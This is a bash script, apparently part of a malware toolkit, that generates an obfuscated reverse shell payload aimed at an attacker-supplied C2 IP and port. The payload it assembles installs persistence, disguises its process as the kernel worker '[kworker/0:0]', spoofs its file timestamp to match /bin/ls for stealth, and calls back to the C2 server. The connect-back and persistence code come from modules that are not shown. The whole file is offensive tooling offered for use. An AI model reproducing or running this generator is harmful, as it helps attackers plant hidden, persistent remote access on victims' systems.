#!/bin/bash

# generator.sh

# This script will generate a reverse shell payload.

# --- Command-line argument parsing ---

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <C2_IP> <C2_PORT>"
    exit 1
fi

C2_IP="$1"
C2_PORT="$2"

echo "[*] Generating reverse shell for $C2_IP:$C2_PORT..."

# --- Read modules ---

connection_module=$(cat src/connection.sh)
persistence_module=$(cat src/persistence.sh)

# --- Substitute placeholder values ---

connection_module=${connection_module//%%C2_IP%%/$C2_IP}
connection_module=${connection_module//%%C2_PORT%%/$C2_PORT}

# --- Assemble the payload ---

payload=$(cat << EOF
#!/bin/bash

# --- Generated reverse shell payload ---

# --- Persistence module ---
$persistence_module

# --- Connection module ---
$connection_module

# --- Main execution flow ---

if [ "\$1" != "--child" ]; then
    # Parent process: sets up persistence, then re-executes as a child and exits.
    setup_persistence
    (exec -a "[kworker/0:0]" "\$0" --child) &
    exit 0
else
    # Child process: runs the actual connection loop.
    # Timestamp spoofing for stealth
    touch -r /bin/ls "\$0" 2>/dev/null
    establish_connection
fi
EOF
)

# --- Obfuscate and output the payload ---

echo "$payload" | bash src/obfuscation.sh obfuscate_payload > reverse_shell.sh

echo "[+] Reverse shell generated successfully: reverse_shell.sh"
